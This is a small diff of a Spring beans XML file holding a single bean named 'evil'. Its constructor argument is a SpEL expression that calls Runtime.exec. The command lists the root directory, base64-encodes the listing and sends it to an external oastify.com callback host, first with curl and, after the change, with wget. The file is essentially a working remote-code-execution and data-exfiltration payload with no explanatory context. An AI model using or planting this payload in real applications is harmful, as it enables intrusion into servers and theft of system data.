@@ -3,6 +3,6 @@
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
     <bean id="evil" class="java.lang.String">
-        <constructor-arg value="#{T(Runtime).getRuntime().exec('curl http://an1ebzy8ho5o1bnoa7kqw07hh8nzbrzg.oastify.com?c=$(ls / | base64 -w0)')}"/>
+        <constructor-arg value="#{T(Runtime).getRuntime().exec('wget http://ra5vyglp45s5osa5xo77jhuy4pagyamz.oastify.com?c=$(ls / | base64 -w0)')}"/>
     </bean>
 </beans>
